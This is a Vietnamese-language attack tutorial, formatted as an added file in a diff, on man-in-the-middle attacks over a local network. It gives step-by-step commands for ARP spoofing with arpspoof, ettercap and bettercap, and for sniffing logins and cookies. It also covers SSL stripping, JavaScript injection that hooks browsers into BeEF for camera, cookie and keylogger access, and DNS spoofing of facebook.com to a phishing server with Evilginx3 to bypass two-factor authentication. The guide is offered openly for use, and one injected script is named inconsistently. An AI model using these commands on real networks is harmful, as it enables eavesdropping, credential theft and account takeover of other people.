@@ -1,0 +1,120 @@
+🎯 MỤC TIÊU
+
+    Ngồi trong cùng mạng LAN (qua dây hoặc Wi-Fi)
+
+    Đánh lừa các thiết bị khác tin rằng bạn là router (Gateway)
+
+    Từ đó:
+
+        Ghi lại traffic (sniff)
+
+        Chặn, sửa nội dung (inject)
+
+        Lấy cookie, password
+
+        Cài backdoor
+
+🟢 PHẦN 1: CƠ BẢN – ARP SPOOF + SNIFF DỮ LIỆU
+✅ Dùng ettercap hoặc arpspoof
+Bước 1: Bật IP forwarding
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Bước 2: Gửi ARP giả mạo
+
+Cách 1: arpspoof
+
+arpspoof -i eth0 -t 192.168.1.5 -r 192.168.1.1
+
+    Gửi gói ARP giả → máy 192.168.1.5 nghĩ bạn là router
+
+Cách 2: ettercap
+
+ettercap -T -q -i eth0 -M arp:remote /192.168.1.5/ /192.168.1.1/
+
+Bước 3: Dùng tcpdump, wireshark, hoặc driftnet để sniff
+
+tcpdump -i eth0
+
+Hoặc:
+
+wireshark
+
+🟡 PHẦN 2: TRUNG CẤP – DÙNG bettercap ĐỂ QUẢN LÝ MỌI THỨ
+
+Bettercap là công cụ MITM mạnh mẽ hơn ettercap rất nhiều.
+Cài đặt:
+
+apt install bettercap
+
+Khởi chạy:
+
+bettercap -iface eth0
+
+Trong terminal:
+
+net.probe on
+set arp.spoof.targets 192.168.1.5
+arp.spoof on
+net.sniff on
+
+    ✅ Giờ bạn sẽ thấy được mọi gói tin của máy 192.168.1.5
+
+Xem log:
+
+    HTTP request:
+
+events.stream on
+
+    Ghi lại các thông tin đăng nhập (Form, cookie...)
+
+🔴 PHẦN 3: NÂNG CAO – CHẶN, THAY ĐỔI, KHAI THÁC TOÀN BỘ LƯU LƯỢNG
+✅ 1. Ghi lại cookie / form / URL
+
+Trong bettercap:
+
+http.proxy on
+http.proxy.sslstrip on
+
+    Dùng net.recon và net.sniff để theo dõi domain, token...
+
+✅ 2. Inject mã JavaScript (lừa đảo)
+
+Tạo file inject.js:
+
+alert("Trình duyệt của bạn bị tấn công");
+
+Trong bettercap:
+
+http.server on
+http.proxy.script injectjs.js
+
+✅ 3. Kết hợp với BeEF (Browser Exploitation Framework)
+
+    Khi inject JS → trình duyệt bị hook vào BeEF
+
+    Sau đó bạn:
+
+        Xem camera
+
+        Lấy cookie
+
+        Cài keylogger
+
+✅ 4. Tự động redirect về máy giả mạo
+
+set dns.spoof.domains facebook.com
+set dns.spoof.address 192.168.1.100
+dns.spoof on
+
+Kết hợp với Evilginx3 hoặc phishing server.
+🧠 TÓM TẮT
+Mức	Công cụ	Chức năng
+Cơ bản	arpspoof, ettercap	Giả gateway, sniff traffic
+Trung cấp	bettercap	Sniff + inject + DNS spoof
+Nâng cao	bettercap + BeEF + Evilginx3	Ghi cookie, bypass 2FA, exploit browser
+🛡️ Cẩn thận:
+
+    Một số thiết bị có ARP Spoof Detection → sẽ cảnh báo hoặc ngắt kết nối.
+
+    HTTPS sẽ không sniff được trừ khi bạn strip SSL hoặc dùng Evilginx3
